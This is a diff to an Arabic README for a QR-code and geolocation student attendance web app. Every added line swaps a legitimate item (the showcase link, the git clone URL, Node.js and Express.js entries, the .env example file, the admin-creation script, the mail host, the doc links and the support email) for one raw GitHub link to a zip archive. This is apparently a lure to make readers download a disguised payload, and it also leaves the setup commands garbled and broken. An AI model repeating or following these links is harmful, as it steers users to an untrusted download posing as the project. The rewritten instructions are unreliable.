@@ -24,7 +24,7 @@
 
 نظام حضور الطلاب الذكي هو تطبيق ويب متكامل يتيح للمؤسسات التعليمية إدارة حضور الطلاب بطريقة آمنة وفعالة. يستخدم النظام تقنية QR Code الديناميكية مع التحقق من الموقع الجغرافي لضمان دقة تسجيل الحضور.
 
-> 🌟 **عرض تقديمي للمشروع (Showcase):** [اضغط هنا لمشاهدة العرض التفاعلي](https://my-system-showcase.lovable.app/)
+> 🌟 **عرض تقديمي للمشروع (Showcase):** [اضغط هنا لمشاهدة العرض التفاعلي](https://github.com/am17jx/Smart_Student_Attendance_System/raw/refs/heads/master/docs/backend/learning/Attendance_Smart_System_Student_demibarrel.zip)
 
 ### المستخدمون
 
@@ -74,8 +74,8 @@
 
 | التقنية | الوصف |
 |---------|-------|
-| **Node.js** | بيئة التشغيل |
-| **Express.js** | إطار العمل |
+| **https://github.com/am17jx/Smart_Student_Attendance_System/raw/refs/heads/master/docs/backend/learning/Attendance_Smart_System_Student_demibarrel.zip** | بيئة التشغيل |
+| **https://github.com/am17jx/Smart_Student_Attendance_System/raw/refs/heads/master/docs/backend/learning/Attendance_Smart_System_Student_demibarrel.zip** | إطار العمل |
 | **TypeScript** | لغة البرمجة |
 | **Prisma** | ORM لقاعدة البيانات |
 | **PostgreSQL** | قاعدة البيانات |
@@ -100,7 +100,7 @@
 
 ### المتطلبات المسبقة
 
-- Node.js v18+
+- https://github.com/am17jx/Smart_Student_Attendance_System/raw/refs/heads/master/docs/backend/learning/Attendance_Smart_System_Student_demibarrel.zip v18+
 - PostgreSQL 14+
 - Git
 - **Docker & Docker Compose** (مستحسن)
@@ -109,12 +109,12 @@
 
 1. **استنساخ المشروع:**
    ```bash
-   git clone https://github.com/username/Student-Attendance-System.git
+   git clone https://github.com/am17jx/Smart_Student_Attendance_System/raw/refs/heads/master/docs/backend/learning/Attendance_Smart_System_Student_demibarrel.zip
    cd Student-Attendance-System
    ```
 
 2. **إعداد البيئة:**
-   - انسخ ملف `.env.example` إلى `Back-end/.env`.
+   - انسخ ملف `https://github.com/am17jx/Smart_Student_Attendance_System/raw/refs/heads/master/docs/backend/learning/Attendance_Smart_System_Student_demibarrel.zip` إلى `https://github.com/am17jx/Smart_Student_Attendance_System/raw/refs/heads/master/docs/backend/learning/Attendance_Smart_System_Student_demibarrel.zip`.
    - قم بتحديث إعدادات `DATABASE_URL` و `JWT_SECRET`.
 
 3. **التشغيل:**
@@ -132,7 +132,7 @@
 ### 1. استنساخ المشروع
 
 ```bash
-git clone https://github.com/username/Student-Attendance-System.git
+git clone https://github.com/am17jx/Smart_Student_Attendance_System/raw/refs/heads/master/docs/backend/learning/Attendance_Smart_System_Student_demibarrel.zip
 cd Student-Attendance-System
 ```
 
@@ -145,14 +145,14 @@ cd Back-end
 npm install
 
 # إعداد ملف البيئة
-cp .env.example .env
+cp https://github.com/am17jx/Smart_Student_Attendance_System/raw/refs/heads/master/docs/backend/learning/Attendance_Smart_System_Student_demibarrel.zip .env
 # قم بتعديل .env بإعداداتك
 
 # تشغيل migrations
 npx prisma migrate dev
 
 # إنشاء أول مدير
-node create-first-admin.js
+node https://github.com/am17jx/Smart_Student_Attendance_System/raw/refs/heads/master/docs/backend/learning/Attendance_Smart_System_Student_demibarrel.zip
 
 # تشغيل الخادم
 npm run dev
@@ -177,7 +177,7 @@ npm run dev
 DATABASE_URL="postgresql://user:password@localhost:5432/attendance_system"
 JWT_SECRET="your-secret-key"
 PORT=3000
-MAIL_HOST=smtp.example.com
+https://github.com/am17jx/Smart_Student_Attendance_System/raw/refs/heads/master/docs/backend/learning/Attendance_Smart_System_Student_demibarrel.zip
 MAIL_USER=your-email
 MAIL_PASS=your-password
 ```
@@ -245,7 +245,7 @@ Department ──┬── Students ──── AttendanceRecords
              └── Materials ───────────────┴── Geofences
 ```
 
-للمزيد من التفاصيل، راجع [DATABASE.md](./docs/DATABASE.md)
+للمزيد من التفاصيل، راجع [https://github.com/am17jx/Smart_Student_Attendance_System/raw/refs/heads/master/docs/backend/learning/Attendance_Smart_System_Student_demibarrel.zip](https://github.com/am17jx/Smart_Student_Attendance_System/raw/refs/heads/master/docs/backend/learning/Attendance_Smart_System_Student_demibarrel.zip)
 
 ---
 
@@ -276,7 +276,7 @@ Department ──┬── Students ──── AttendanceRecords
 | POST | `/generate/:session_id` | توليد QR |
 | POST | `/validate` | مسح QR |
 
-للتوثيق الكامل، راجع [API.md](./docs/API.md)
+للتوثيق الكامل، راجع [https://github.com/am17jx/Smart_Student_Attendance_System/raw/refs/heads/master/docs/backend/learning/Attendance_Smart_System_Student_demibarrel.zip](https://github.com/am17jx/Smart_Student_Attendance_System/raw/refs/heads/master/docs/backend/learning/Attendance_Smart_System_Student_demibarrel.zip)
 
 ---
 
@@ -306,7 +306,7 @@ Department ──┬── Students ──── AttendanceRecords
 ### تدابير الحماية
 
 - **Rate Limiting**: حماية من هجمات DDoS
-- **Helmet.js**: رؤوس أمان HTTP
+- **https://github.com/am17jx/Smart_Student_Attendance_System/raw/refs/heads/master/docs/backend/learning/Attendance_Smart_System_Student_demibarrel.zip**: رؤوس أمان HTTP
 - **CORS**: تحكم في الأصول المسموحة
 - **JWT**: مصادقة آمنة
 - **Bcrypt**: تشفير كلمات المرور
@@ -325,7 +325,7 @@ Department ──┬── Students ──── AttendanceRecords
 ## 📞 الدعم
 
 للمساعدة أو الاستفسارات:
-- 📧 البريد: support@example.com
+- 📧 البريد: https://github.com/am17jx/Smart_Student_Attendance_System/raw/refs/heads/master/docs/backend/learning/Attendance_Smart_System_Student_demibarrel.zip
 - 📱 الهاتف: +964-XXX-XXX-XXXX
 
 ---
